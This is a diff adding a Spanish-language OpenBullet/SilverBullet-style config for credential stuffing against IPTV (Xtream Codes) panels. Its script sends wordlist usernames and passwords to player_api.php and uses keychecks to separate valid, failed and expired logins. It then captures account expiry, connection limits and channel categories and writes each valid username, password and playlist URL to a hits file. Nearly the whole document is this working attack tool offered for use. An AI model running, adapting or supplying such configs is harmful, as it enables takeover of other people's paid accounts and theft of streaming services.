@@ -1,0 +1,183 @@
+[SETTINGS]
+{
+  "Name": "IPTV UNIVERSAL_V-1_🍺--🅻🅰️_🅱️🅾️🆅🅴🅳🅰️--☠️",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2025-02-21T21:51:25.9975992+01:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Base64ImageData": "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",
+  "Author": "🍺--🅻🅰️_🅱️🅾️🆅🅴🅳🅰️--☠️",
+  "Version": "1.0.0 [OBM2 PRO]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "url y puerto",
+      "VariableName": "URL",
+      "Id": 1814782950
+    }
+  ],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "IPTV UNIVERSAL_V-1_🍺--🅻🅰️_🅱️🅾️🆅🅴🅳🅰️--☠️",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+#LOGIN REQUEST GET "http://<URL>/player_api.php?username=<USER>&password=<PASS>&type=m3u" 
+  
+  HEADER "Host: <URL>" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: es-US,es-419;q=0.9,es;q=0.8" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"Active\"" 
+    KEY "\"auth\":1,\"" 
+    KEY "\"Welcome to Xtream Codes Reborn\"" 
+    KEY "<RESPONSECODE>" Contains "200" 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "404" 
+    KEY "{\"user_info\":{\"auth\":0}}" 
+    KEY "404" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\":\"Expired\"," 
+
+#CREADO PARSE "<SOURCE>" JSON "created_at" -> VAR "created_at" 
+
+#EXPIRA PARSE "<SOURCE>" JSON "exp_date" -> VAR "exp_date" 
+
+#FUNCION1 FUNCTION UnixTimeToDate "yyyy-MM-dd  HH:mm:ss" "<created_at>" -> CAP "Creada" 
+
+#FUNCION2 FUNCTION UnixTimeToDate "yyyy-MM-dd  HH:mm:ss" "<exp_date>" -> CAP "Expiración" 
+
+#REAL_URL PARSE "<SOURCE>" JSON "url" -> VAR "Real URL" 
+
+#PUERTO PARSE "<SOURCE>" JSON "port" -> VAR "Real Port" 
+
+#FUNCION4 FUNCTION Constant "http://<Real URL>:<Real Port>/get.php?username=<USER>&password=<PASS>&type=m3u_plus" -> CAP "URL M3u" 
+
+#GRATUITO PARSE "<SOURCE>" JSON "is_trial" -> VAR "is_trial" 
+
+#FUNCION3 FUNCTION Translate 
+  KEY "0" VALUE "NO" 
+  KEY "1" VALUE "SI" 
+  "<is_trial>" -> CAP "Prueva" 
+
+#estado PARSE "<SOURCE>" LR "status\":\"" "\",\"exp_" -> CAP "ESTADO" 
+
+#CONEXIONES PARSE "<SOURCE>" JSON "max_connections" -> CAP "Conexiones Maximas" 
+
+#CONECTADOS PARSE "<SOURCE>" JSON "active_cons" -> CAP "Conectados" 
+
+#LOGIN2 REQUEST GET "http://<Real URL>:<Real Port>/player_api.php?username=<USER>&password=<PASS>&action=get_live_categories" 
+  
+  HEADER "Host: <Real URL>:<Real Port>" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: es-US,es-419;q=0.9,es;q=0.8" 
+
+#CATEGORIAS_TV PARSE "<SOURCE>" LR "\",\"category_name\":\"" "\",\"" Recursive=TRUE -> VAR "Categorias de TV" 
+
+#FUNCION_TV FUNCTION Translate 
+  KEY "," VALUE "🔥" 
+  KEY "\\u2022" VALUE "🔥" 
+  KEY "[" VALUE "" 
+  KEY "\\/" VALUE "-" 
+  "<Categorias de TV>" -> CAP "Categorias Live" 
+
+#LOGIN3 REQUEST GET "http://<Real URL>:<Real Port>/player_api.php?username=<USER>&password=<PASS>&action=get_vod_categories" 
+  
+  HEADER "Host: <Real URL>:<Real Port>" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: es-US,es-419;q=0.9,es;q=0.8" 
+
+#CATEGORIAS_PELICULAS PARSE "<SOURCE>" LR "\",\"category_name\":\"" "\",\"" Recursive=TRUE -> VAR "Categorias de PELICULAS" 
+
+#FUNCION_PELIS FUNCTION Translate 
+  KEY "," VALUE "🔥" 
+  KEY "\\/" VALUE "-" 
+  "<Categorias de PELICULAS>" -> CAP "Categorias pelis" 
+
+#LOGIN4 REQUEST GET "http://<Real URL>:<Real Port>/player_api.php?username=<USER>&password=<PASS>&action=get_series_categories" 
+  
+  HEADER "Host: <Real URL>:<Real Port>" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: es-US,es-419;q=0.9,es;q=0.8" 
+
+#CATEGORIAS_SERIES PARSE "<SOURCE>" LR "\",\"category_name\":\"" "\",\"" Recursive=TRUE -> VAR "Categorias de SERIES" 
+
+UTILITY File "Hits iptv universal.txt" AppendLines "📺  ✦»»  Ⓑⓘⓢⓜⓐⓡⓚ  ««✦  📺\\r\\n🛰𝕾𝖊𝖗𝖛𝖎𝖉𝖔𝖗: http://<Real URL>:<Real Port>\\r\\n👤𝖀𝖘𝖚𝖆𝖗𝖎𝖔: <USER>\\r\\n🔑𝕮𝖔𝖓𝖙𝖗𝖆𝖘𝖊𝖓̃𝖆: <PASS>\\r\\n🙏𝕻𝖗𝖚𝖊𝖇𝖆 : <Prueva>\\r\\n📆𝕰𝖝𝖕𝖎𝖗𝖆𝖈𝖎𝖔𝖓: <Expiración>\\r\\n👥𝕮𝖔𝖓𝖊𝖝𝖎𝖔𝖓𝖊𝖘 𝕸𝖆𝖝𝖎𝖒𝖆𝖘: <Conexiones Maximas>\\r\\n👁𝕮𝖔𝖓𝖊𝖈𝖙𝖆𝖉𝖔𝖘: <Conectados>\\r\\n🔗𝕷𝖎𝖘𝖙𝖆 𝖒3𝖚: http://<Real URL>:<Real Port>/get.php?username=<USER>&password=<PASS>&type=m3u_plus\\r\\n 📡 𝕮𝖆𝖙𝖊𝖌𝖔𝖗𝖎𝖆𝖘 𝕯𝖊 𝕋𝕍 📡\\r\\n<Categorias Live>\\r\\n🎬 𝕮𝖆𝖙𝖊𝖌𝖔𝖗𝖎𝖆𝖘 𝕯𝖊 𝕻𝖊𝖑𝖎𝖈𝖚𝖑𝖆𝖘 🎬 \\r\\n<Categorias pelis>\\r\\n🎥 𝕮𝖆𝖙𝖊𝖌𝖔𝖗𝖎𝖆𝖘 𝕯𝖊 𝕾𝖊𝖗𝖎𝖊𝖘 🎥 \\r\\n<Categorias series>\\r\\n ❈──────────────────────────────────────────────────────────────────────────────────────❈\\r\\n" 
+
+IF "<SOURCE>" Contains "exp_date\":null" 
+
+FUNCTION Constant "<exp_date>" -> VAR "Vence" 
+
+ELSE 
+
+FUNCTION UnixTimeToDate "yyyy-MM-dd:HH-mm-ss" "MMMM dd yyyy" 
+
+ENDIF
+
+#🅻🅰️_🅱️🅾️🆅🅴🅳🅰️ FUNCTION Constant "🅻🅰️_🅱️🅾️🆅🅴🅳🅰️" -> CAP " CONFIG_IPTV UNIVERSAL_V-1_ʙʏ_🍺--🅻🅰️_🅱️🅾️🆅🅴🅳🅰️--☠️" 
+
